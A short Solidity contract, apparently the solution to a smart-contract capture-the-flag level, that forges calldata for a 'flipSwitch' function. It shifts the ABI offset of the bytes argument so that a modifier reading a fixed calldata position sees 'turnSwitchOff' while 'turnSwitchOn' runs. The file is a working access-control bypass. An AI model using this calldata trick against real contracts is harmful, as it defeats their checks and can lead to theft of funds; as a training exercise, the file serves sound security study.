// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

contract SwitchAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        // Encode abi to pass the modifier onlyOff()
        bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)", bytes32(uint256(96)), bytes32(""), bytes4(keccak256("turnSwitchOff()")), bytes32(uint256(4)), bytes4(keccak256("turnSwitchOn()")));
        challengeInstance.call(data);
    }
}